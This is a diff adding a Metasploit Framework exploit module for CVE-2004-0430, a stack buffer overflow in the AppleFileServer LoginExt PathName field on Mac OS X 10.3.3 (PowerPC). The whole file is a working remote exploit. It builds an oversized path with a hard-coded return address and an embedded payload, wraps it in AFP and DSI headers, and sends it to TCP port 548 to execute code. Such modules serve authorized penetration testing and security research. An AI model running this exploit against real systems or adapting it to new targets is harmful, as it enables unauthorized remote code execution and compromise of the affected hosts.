@@ -1,0 +1,109 @@
+##
+# $Id: loginext.rb 10394 2010-09-20 08:06:27Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = AverageRanking
+
+	include Msf::Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'AppleFileServer LoginExt PathName Overflow',
+			'Description'    => %q{
+					This module exploits a stack buffer overflow in the AppleFileServer service
+				on MacOS X. This vulnerability was originally reported by Atstake and
+				was actually one of the few useful advisories ever published by that
+				company. You only have one chance to exploit this bug.
+				This particular exploit uses a stack-based return address that will
+				only work under optimal conditions.
+			},
+			'Author'         => 'hdm',
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 10394 $',
+			'References'     =>
+				[
+					[ 'CVE', '2004-0430'],
+					[ 'OSVDB', '5762'],
+					[ 'BID', '10271'],
+				],
+			'Payload'        =>
+				{
+					'Space'    => 512,
+					'BadChars' => "\x00\x20",
+					'MinNops'  => 128,
+					'Compat'   =>
+						{
+							'ConnectionType' => "+find"
+						}
+				},
+			'Targets'        =>
+				[
+					# Target 0
+					[
+						'Mac OS X 10.3.3',
+						{
+							'Platform' => 'osx',
+							'Arch'     => ARCH_PPC,
+							'Ret'      => 0xf0101c0c # stack address :<
+						},
+					],
+				],
+			'DisclosureDate' => 'May 3 2004'))
+
+		# Configure the default port to be AFP
+		register_options(
+			[
+				Opt::RPORT(548),
+			], self.class)
+	end
+
+	def exploit
+		connect
+
+		print_status("Trying target #{target.name}...")
+
+		path          = "\xff" * 1024
+		path[168, 4]  = Rex::Arch.pack_addr(target.arch, target.ret)
+		path[172, payload.encoded.length] = payload.encoded
+
+		# The AFP header
+		afp = "\x3f\x00\x00\x00"
+
+		# Add the authentication methods
+		["AFP3.1", "Cleartxt Passwrd"].each { |m|
+			afp << [m.length].pack('C') + m
+		}
+
+		# Add the user type and afp path
+		afp << "\x03" + [9].pack('n') + rand_text_alphanumeric(9)
+		afp << "\x03" + [path.length].pack('n') + path
+
+		# Add the data stream interface header
+		dsi =
+		[
+			0,           # Flags
+			2,           # Command
+			rand(65536), # XID
+			0,           # Data Offset
+			afp.length,  # Data Length
+			0            # Reserved
+		].pack("CCnNNN") + afp
+
+		sock.put(dsi)
+
+		handler
+
+		disconnect
+	end
+
+end
